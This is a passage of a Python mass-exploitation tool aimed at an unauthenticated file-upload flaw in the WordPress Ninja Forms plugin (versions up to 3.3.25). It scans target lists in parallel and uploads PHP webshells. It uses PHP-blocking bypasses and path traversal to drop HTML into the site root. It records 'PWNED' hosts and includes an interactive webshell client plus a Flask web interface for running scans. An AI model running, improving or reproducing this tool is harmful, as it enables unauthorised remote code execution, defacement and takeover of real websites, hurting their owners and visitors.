# Keep old name as alias for backward compatibility
def load_urls_from_csv(csv_path):
    return load_urls_from_file(csv_path)


def worker(task_queue, results, form_id, field_id, verbose, exploit_mode, bar_lock,
           payload_file=None, html_file=None, html_dest="../../../../", php_bypass=True,
           output_file=None, save_filter="uploaded"):
    while True:
        try:
            idx, total, url = task_queue.get_nowait()
        except queue.Empty:
            break
        try:
            r = scan_target(url, form_id, field_id, verbose, exploit_mode,
                            payload_file=payload_file, html_file=html_file,
                            html_dest=html_dest, php_bypass=php_bypass)
        except Exception as e:
            r = {"url": url, "status": f"error: {e}", "version": None,
                 "shell": None, "rce_output": None, "html_url": None, "alt_shells": []}

        with bar_lock:
            suffix = ""
            if r.get("html_url"):
                suffix += f" | HTML→{r['html_url']}"
            if r.get("alt_shells"):
                suffix += f" | alts={len(r['alt_shells'])}"
            print(f"  [{idx:>4}/{total}] {r['status']:<30} {url}{suffix}")
            results.append(r)

        # ── Real-time save ─────────────────────────────────────────────────
        _append_result_to_file(r, output_file, save_filter=save_filter)

        task_queue.task_done()


def mass_scan(list_path, form_id, field_id, threads, verbose, exploit_mode, output_file,
              payload_file=None, html_file=None, html_dest="../../../../", php_bypass=True,
              save_filter="uploaded"):
    urls  = load_urls_from_file(list_path)
    total = len(urls)
    print(f"\n[*] Loaded {total} unique targets from {list_path}")
    print(f"[*] Threads: {threads} | Exploit: {exploit_mode}")
    print(f"[*] Save filter: {save_filter}\n")
    if payload_file:
        print(f"[*] Payload : {payload_file}")
    if html_file:
        print(f"[*] HTML    : {html_file}  →  (dest: {html_dest}<filename>)")
    print()

    task_q   = queue.Queue()
    results  = []
    bar_lock = threading.Lock()

    # ── Initialize output file (overwrite any previous run) ───────────────
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(f"# Ninja Forms Scanner — started {__import__('datetime').datetime.now()}\n")
        f.write(f"# Targets: {total} | Exploit: {exploit_mode} | Save filter: {save_filter}\n\n")

    for idx, url in enumerate(urls, 1):
        task_q.put((idx, total, url))

    workers_list = []
    for _ in range(min(threads, total)):
        t = threading.Thread(
            target=worker,
            args=(task_q, results, form_id, field_id, verbose, exploit_mode, bar_lock),
            kwargs={
                "payload_file": payload_file,
                "html_file":    html_file,
                "html_dest":    html_dest,
                "php_bypass":   php_bypass,
                "output_file":  output_file,
                "save_filter":  save_filter,
            },
            daemon=True
        )
        t.start()
        workers_list.append(t)

    task_q.join()

    # ── Final summary (no bulk rewrite — file already has all results) ──
    GOOD_STATUSES = ("PWNED", "VERIFIED", "UPLOADED_EXISTS",
                     "UPLOADED_403", "UPLOADED_404", "UPLOADED_NOEXEC")
    uploaded_results = [r for r in results if r["status"] in GOOD_STATUSES]
    html_results     = [r for r in results if r.get("html_url")]
    pwned            = [r for r in results if r["status"] == "PWNED"]
    verified         = [r for r in results if r["status"] == "VERIFIED"]
    noexec           = [r for r in results if r["status"] == "UPLOADED_NOEXEC"]
    confirmed        = [r for r in results if any(k in r["status"] for k in
                        ("VULNERABLE", "PWNED", "UPLOADED", "VERIFIED"))]
    potential        = [r for r in results if "POTENTIAL" in r["status"]]
    vulnerable       = confirmed + potential

    # Append summary footer to file
    with open(output_file, "a", encoding="utf-8") as f:
        f.write(f"\n# ── Summary ──\n")
        f.write(f"# Scanned: {total} | Vuln: {len(vulnerable)} | PWNED: {len(pwned)}"
                f" | Verified: {len(verified)} | Uploaded: {len(uploaded_results)}"
                f" | NOEXEC: {len(noexec)} | HTML: {len(html_results)}\n")

    print(f"\n{'='*60}")
    print(f"  Scanned      : {total}")
    print(f"  Vulnerable   : {len(vulnerable)}")
    print(f"  PWNED (RCE)  : {len(pwned)}")
    print(f"  VERIFIED     : {len(verified)}")
    print(f"  Uploaded     : {len(uploaded_results)}")
    if noexec:
        print(f"  NOEXEC (static) : {len(noexec)}  ← file uploaded, PHP blocked by server")
    if html_results:
        print(f"  HTML Root    : {len(html_results)}")
    print(f"  Results      : {output_file}")
    print(f"{'='*60}")

    return results


# ──────────────────────────────────────────────
# 7.  INTERACTIVE SHELL
# ──────────────────────────────────────────────

def interactive_shell(shell_url):
    session = make_session()
    print(f"\n[*] Interactive shell -> {shell_url}")
    print("[*] Type 'exit' to quit.\n")
    while True:
        try:
            cmd = input("shell> ").strip()
        except (KeyboardInterrupt, EOFError):
            break
        if cmd.lower() in ("exit", "quit"):
            break
        if not cmd:
            continue
        try:
            r = session.get(shell_url, params={"cmd": cmd}, verify=False, timeout=TIMEOUT)
            print(r.text.strip())
        except Exception as e:
            print(f"[!] {e}")


# ──────────────────────────────────────────────
# 8.  FLASK WEB SERVER
# ──────────────────────────────────────────────

import io
import tempfile
import os

_stop_flag   = threading.Event()
_scan_active = threading.Event()

# ── Live broadcast to all connected browser tabs ──────────────────────────────
# Each connected client gets its own queue so ALL clients see ALL messages.
# _sse_history stores every message of the current scan session so that a
# browser tab that opens mid-scan can replay everything it missed.
_sse_lock    = threading.Lock()
_sse_clients : set  = set()          # set of per-client queue.Queue objects
_sse_history : list = []             # replay buffer for late-joining clients
_SSE_HISTORY_MAX = 2000              # maximum messages kept in history


def _broadcast(msg: dict):
    """Send msg to every connected SSE client and append to history."""
    with _sse_lock:
        _sse_history.append(msg)
        if len(_sse_history) > _SSE_HISTORY_MAX:
            _sse_history.pop(0)
        for q in _sse_clients:
            try:
                q.put_nowait(msg)
            except Exception:
                pass  # client queue full / disconnected — skip


def _clear_sse_session():
    """Wipe history at the start of a new scan so old logs don't replay."""
    with _sse_lock:
        _sse_history.clear()


class _TeeOutput(io.TextIOBase):
    """Redirect stdout so every print() also broadcasts to all SSE clients."""
    def __init__(self, original):
        self._orig = original

    def write(self, text):
        self._orig.write(text)
        self._orig.flush()
        line = text.rstrip("\n")
        if line:
            _broadcast({"type": "log", "msg": line})
        return len(text)

    def flush(self):
        self._orig.flush()


def _status_update_stats(status, stats):
    """Update shared stats dict based on a result status string."""
    GOOD = ("PWNED", "VERIFIED", "UPLOADED_EXISTS", "UPLOADED_403",
            "UPLOADED_404", "UPLOADED_NOEXEC")
    if any(k in status for k in ("VULN", "PWNED", "UPLOADED", "VERIFIED")):
        stats["vuln"] += 1
    if any(status.startswith(k) for k in GOOD):
        stats["uploaded"] += 1
    if "PWNED" in status:
        stats["pwned"] += 1
    if status == "VERIFIED":
        stats.setdefault("verified", 0)
        stats["verified"] += 1


def _parse_result_line(line):
    """Extract stats from a scan output line like:  [  12/594] UPLOADED ..."""
    import re
    m = re.match(r"\s*\[\s*(\d+)/\s*(\d+)\]\s+(\S+)\s+(https?://\S+)", line)
    if m:
        return {"idx": int(m.group(1)), "total": int(m.group(2)),
                "status": m.group(3), "url": m.group(4)}
    return None


def _run_scan_web(kwargs):
    """Background thread that runs scan and streams output via SSE."""
    _scan_active.set()
    _stop_flag.clear()

    orig_stdout = sys.stdout
    sys.stdout = _TeeOutput(orig_stdout)

    stats = {"scanned": 0, "vuln": 0, "uploaded": 0, "pwned": 0, "verified": 0, "html": 0, "total": 0}

    try:
        target_type  = kwargs.get("target_type", "url")
        payload_file = kwargs.get("payload_file")
        html_file    = kwargs.get("html_file")
        html_dest    = kwargs.get("html_dest", "../../../../")
        exploit_mode = kwargs.get("exploit", True)
        php_bypass   = kwargs.get("php_bypass", True)
        verbose      = kwargs.get("verbose", False)
        form_id      = kwargs.get("form_id", 1)
        field_id     = kwargs.get("field_id", 1)
        threads      = kwargs.get("threads", 20)
        output_file  = kwargs.get("output", "results.txt")
        save_filter  = kwargs.get("save_filter", "uploaded")

        if target_type == "url":
            url = kwargs["url"]
            stats["total"] = 1
            r = scan_target(url, form_id, field_id,
                            verbose=verbose, exploit_mode=exploit_mode,
                            payload_file=payload_file, html_file=html_file,
                            html_dest=html_dest, php_bypass=php_bypass)
            stats["scanned"] = 1
            _status_update_stats(r["status"], stats)
            if r.get("html_url"):
                stats["html"] += 1
            _append_result_to_file(r, output_file, save_filter=save_filter)
            _broadcast({"type": "result", "result": {
                "url": r["url"], "status": r["status"],
                "version": r.get("version"), "shell": r.get("shell"),
                "html_url": r.get("html_url"),
            }, "stats": stats})

        else:
            list_path = kwargs["list_path"]
            urls      = load_urls_from_file(list_path)
            stats["total"] = len(urls)
            _broadcast({"type": "stats", **stats})

            task_q   = queue.Queue()
            results  = []
            bar_lock = threading.Lock()

            for idx, url in enumerate(urls, 1):
                task_q.put((idx, len(urls), url))

            # Initialize output file
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(f"# Ninja Forms Scanner — {__import__('datetime').datetime.now()}\n")
                f.write(f"# Targets: {len(urls)} | Exploit: {exploit_mode} | Save filter: {save_filter}\n\n")

            def _worker_web():
                while not _stop_flag.is_set():
                    try:
                        idx, total, url = task_q.get_nowait()
                    except queue.Empty:
                        break
                    try:
                        r = scan_target(url, form_id, field_id,
                                        verbose=verbose, exploit_mode=exploit_mode,
                                        payload_file=payload_file, html_file=html_file,
                                        html_dest=html_dest, php_bypass=php_bypass)
                    except Exception as e:
                        r = {"url": url, "status": f"error: {e}", "version": None,
                             "shell": None, "rce_output": None, "html_url": None, "alt_shells": []}

                    # ── Real-time save ──────────────────────────────────────
                    _append_result_to_file(r, output_file, save_filter=save_filter)

                    with bar_lock:
                        results.append(r)
                        stats["scanned"] += 1
                        _status_update_stats(r["status"], stats)
                        if r.get("html_url"):
                            stats["html"] += 1

                        _broadcast({"type": "result", "result": {
                            "url": r["url"], "status": r["status"],
                            "version": r.get("version"), "shell": r.get("shell"),
                            "html_url": r.get("html_url"),
                        }, "stats": dict(stats)})

                    task_q.task_done()

            workers = [threading.Thread(target=_worker_web, daemon=True)
                       for _ in range(min(threads, len(urls)))]
            for w in workers: w.start()
            task_q.join()

    except Exception as e:
        _broadcast({"type": "log", "msg": f"[!] خطأ: {e}"})
    finally:
        sys.stdout = orig_stdout
        _scan_active.clear()
        _broadcast({"type": "done"})


def start_web_server(port=5000):
    try:
        from flask import Flask, request, jsonify, Response, send_from_directory
    except ImportError:
        print("[!] Flask غير مثبّت. شغّل: pip install flask")
        sys.exit(1)

    app = Flask(__name__)

    @app.route("/")
    def index():
        return send_from_directory("web", "index.html")

    @app.route("/api/scan", methods=["POST"])
    def api_scan():
        if _scan_active.is_set():
            return jsonify({"ok": False, "error": "مسح آخر قيد التشغيل"})

        tmp_dir  = tempfile.mkdtemp()
        kwargs   = {}

        kwargs["target_type"] = request.form.get("target_type", "url")
        kwargs["url"]         = request.form.get("url", "")
        kwargs["html_dest"]   = request.form.get("html_dest", "../../../../")
        kwargs["form_id"]     = int(request.form.get("form_id", 1))
        kwargs["field_id"]    = int(request.form.get("field_id", 1))
        kwargs["threads"]     = int(request.form.get("threads", 20))
        kwargs["output"]      = request.form.get("output", "results.txt")
        kwargs["exploit"]      = request.form.get("exploit", "1") == "1"
        kwargs["php_bypass"]   = request.form.get("php_bypass", "1") == "1"
        kwargs["verbose"]      = request.form.get("verbose", "0") == "1"
        kwargs["save_filter"]  = request.form.get("save_filter", "uploaded")

        # Handle list file upload
        if kwargs["target_type"] == "list":
            lf = request.files.get("list_file")
            if not lf:
                return jsonify({"ok": False, "error": "لم يتم رفع ملف القائمة"})
            list_path = os.path.join(tmp_dir, lf.filename)
            lf.save(list_path)
            kwargs["list_path"] = list_path

        # Handle payload file upload (optional)
        pf = request.files.get("payload_file")
        if pf and pf.filename:
            pf_path = os.path.join(tmp_dir, pf.filename)
            pf.save(pf_path)
            kwargs["payload_file"] = pf_path
        else:
            kwargs["payload_file"] = None

        # Handle HTML file upload (optional)
        hf = request.files.get("html_file")
        if hf and hf.filename:
            hf_path = os.path.join(tmp_dir, hf.filename)
            hf.save(hf_path)
            kwargs["html_file"] = hf_path
        else:
            kwargs["html_file"] = None

        # Clear SSE history so new scan starts fresh for all clients
        _clear_sse_session()

        t = threading.Thread(target=_run_scan_web, args=(kwargs,), daemon=True)
        t.start()
        return jsonify({"ok": True})

    @app.route("/api/stream")
    def api_stream():
        """
        Per-client SSE stream.  Each connecting browser tab gets its own queue
        registered in _sse_clients.  _broadcast() pushes to every queue so ALL
        tabs see ALL messages in real time.
        New clients joining mid-scan get the full history replayed first so they
        don't miss anything.
        """
        client_q = queue.Queue(maxsize=2000)

        def generate():
            # Register this client
            with _sse_lock:
                # Snapshot history before registering so we don't miss any
                # messages that arrive between the snapshot and registration.
                history_snapshot = list(_sse_history)
                _sse_clients.add(client_q)

            try:
                # ── Replay history so late-joining tabs see everything ─────
                history_had_done = False
                for msg in history_snapshot:
                    yield f"data: {json.dumps(msg, ensure_ascii=False)}\n\n"
                    if msg.get("type") == "done":
                        history_had_done = True
                        break  # scan already finished — stop here

                if history_had_done:
                    return  # nothing more to do

                # If scan ended between snapshot and now, send done
                if not _scan_active.is_set():
                    yield "data: {\"type\":\"ping\"}\n\n"
                    yield "data: {\"type\":\"done\"}\n\n"
                    return

                # ── Live stream ───────────────────────────────────────────
                while True:
                    try:
                        msg = client_q.get(timeout=20)
                        yield f"data: {json.dumps(msg, ensure_ascii=False)}\n\n"
                        if msg.get("type") == "done":
                            break
                    except queue.Empty:
                        yield "data: {\"type\":\"ping\"}\n\n"
                        # Safety valve: if scan ended but "done" was missed
                        if not _scan_active.is_set():
                            yield "data: {\"type\":\"done\"}\n\n"
                            break
            finally:
                # Always unregister, even on network disconnect
                with _sse_lock:
                    _sse_clients.discard(client_q)

        return Response(generate(),
                        mimetype="text/event-stream",
                        headers={"Cache-Control": "no-cache",
                                 "X-Accel-Buffering": "no",
                                 "Access-Control-Allow-Origin": "*"})

    @app.route("/api/status")
    def api_status():
        return jsonify({"active": _scan_active.is_set()})

    @app.route("/api/stop", methods=["POST"])
    def api_stop():
        _stop_flag.set()
        return jsonify({"ok": True})

    @app.route("/api/results")
    def api_results():
        files = sorted(
            [f for f in os.listdir(".") if f.endswith(".txt") and not f.startswith(".")],
            key=lambda f: os.path.getmtime(f), reverse=True
        )
        return jsonify(files)

    @app.route("/api/download/<path:filename>")
    def api_download(filename):
        safe = os.path.basename(filename)
        return send_from_directory(".", safe, as_attachment=True)

    host = "0.0.0.0"
    print(f"\n[*] واجهة الويب تعمل على: http://localhost:{port}")
    print(f"[*] اضغط Ctrl+C للإيقاف\n")
    app.run(host=host, port=port, threaded=True, use_reloader=False)


# ──────────────────────────────────────────────
# 9.  ENTRY POINT
# ──────────────────────────────────────────────

def main():
    print(BANNER)

    # ── Web UI mode: no arguments → start Flask ───────────────────────────
    web_ui_exists = Path("web/index.html").exists()
    if len(sys.argv) == 1:
        if web_ui_exists:
            start_web_server()
        else:
            print("[-] لا توجد وسيطات وملف web/index.html غير موجود.")
            print("    استخدم: python3 main.py -u <url> -e")
        return

    parser = argparse.ArgumentParser(
        description="Ninja Forms File Upload <= 3.3.25 — Unauth RCE — Mass Scanner",
        formatter_class=argparse.RawTextHelpFormatter
    )
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("-u", "--url",   help="Single target WordPress URL")
    mode.add_argument("--csv",         help="(legacy) CSV file with targets (uses 'link' column)")
    mode.add_argument("--list",        help="Target list: CSV (uses 'link' col) OR plain TXT (one URL per line)")

    # ── Payload options ──
    parser.add_argument("--file",      default=None,
                        help="File to upload as PoC payload (.txt, .php, etc.)  Default: hello.php")
    parser.add_argument("--html-file", default=None, metavar="HTML_FILE",
                        help="HTML file to upload to a custom path via path traversal\n"
                             "Example: --html-file index.html")
    parser.add_argument("--html-dest", default="../../../../", metavar="TRAVERSAL_PATH",
                        help="Path traversal destination for the HTML file\n"
                             "Default: '../../../../'  (= WordPress root from ninja-forms/tmp/)\n"
                             "  ../../../../  → WP root\n"
                             "  ../../../     → wp-content/\n"
                             "  ../../        → wp-content/uploads/")
    parser.add_argument("--no-php-bypass", action="store_true",
                        help="Disable PHP 403 bypass techniques (alt extensions + AddType trick)")

    # ── Scan options ──
    parser.add_argument("-f", "--form-id",  type=int, default=1,
                        help="Ninja Forms form ID (default: 1)")
    parser.add_argument("-i", "--field-id", type=int, default=1,
                        help="File upload field ID (default: 1)")
    parser.add_argument("-t", "--threads",  type=int, default=MAX_THREADS,
                        help=f"Threads for mass scan (default: {MAX_THREADS})")
    parser.add_argument("-o", "--output",   default=RESULTS_FILE,
                        help=f"Output file for results (default: {RESULTS_FILE})")
    parser.add_argument("-e", "--exploit",  action="store_true",
                        help="Attempt full exploit chain on vulnerable targets")
    parser.add_argument("-s", "--shell",    metavar="SHELL_URL",
                        help="Launch interactive shell on an already-uploaded webshell URL")
    parser.add_argument("-v", "--verbose",  action="store_true", help="Verbose output")
    parser.add_argument("--save-filter",    default="uploaded",
                        choices=["strict", "uploaded", "all"],
                        help="Controls what gets saved to output file:\n"
                             "  strict   – only PWNED + VERIFIED (confirmed shell access)\n"
                             "  uploaded – PWNED + VERIFIED + UPLOADED_* (any upload, default)\n"
                             "  all      – everything including VULNERABLE (no exploit needed)")

    args = parser.parse_args()

    # ── Resolve & validate files ──────────────────────────────────────────
    payload_file = args.file or None
    html_file    = args.html_file or None
    html_dest    = args.html_dest
    php_bypass   = not args.no_php_bypass
    save_filter  = args.save_filter

    if payload_file and not Path(payload_file).exists():
        print(f"[-] Payload file not found: {payload_file}")
        sys.exit(1)
    if html_file and not Path(html_file).exists():
        print(f"[-] HTML file not found: {html_file}")
        sys.exit(1)

    # ── Interactive shell mode ────────────────────────────────────────────
    if args.shell:
        interactive_shell(args.shell)
        return

    # ── Determine target list or single URL ───────────────────────────────
    list_path = args.list or args.csv

    if list_path:
        if not Path(list_path).exists():
            print(f"[-] File not found: {list_path}")
            sys.exit(1)
        mass_scan(
            list_path=list_path,
            form_id=args.form_id,
            field_id=args.field_id,
            threads=args.threads,
            verbose=args.verbose,
            exploit_mode=args.exploit,
            output_file=args.output,
            payload_file=payload_file,
            html_file=html_file,
            html_dest=html_dest,
            php_bypass=php_bypass,
            save_filter=save_filter,
        )
    else:
        print(f"[*] Target   : {args.url}")
        if payload_file:
            print(f"[*] Payload  : {payload_file}")
        if html_file:
            print(f"[*] HTML     : {html_file}  →  {html_dest}<filename>")
        if not php_bypass:
            print(f"[*] PHP bypass: disabled")
        r = scan_target(
            args.url, args.form_id, args.field_id,
            verbose=args.verbose,
            exploit_mode=args.exploit,
            payload_file=payload_file,
            html_file=html_file,
            html_dest=html_dest,
            php_bypass=php_bypass,
        )
        print(f"\n[*] Status   : {r['status']}")
        if r.get("version"):
            print(f"[*] Version  : {r['version']}")
        if r.get("shell"):
            print(f"[*] Shell    : {r['shell']}")
        if r.get("rce_output"):
            print(f"[*] RCE Out  : {r['rce_output']}")
        if r.get("alt_shells"):
            for alt in r["alt_shells"]:
                print(f"[*] Alt Shell: {alt}")
        if r.get("html_url"):
            print(f"[*] HTML URL : {r['html_url']}")

        if r.get("shell") and args.exploit and args.shell is None:
            if sys.stdin.isatty():
                try:
                    do_shell = input("\n[?] Open interactive shell? (y/n): ").strip().lower()
                    if do_shell == 'y':
                        interactive_shell(r["shell"])
                except (KeyboardInterrupt, EOFError):
                    pass

    print("\n[*] Done.")


if __name__ == "__main__":
    main()
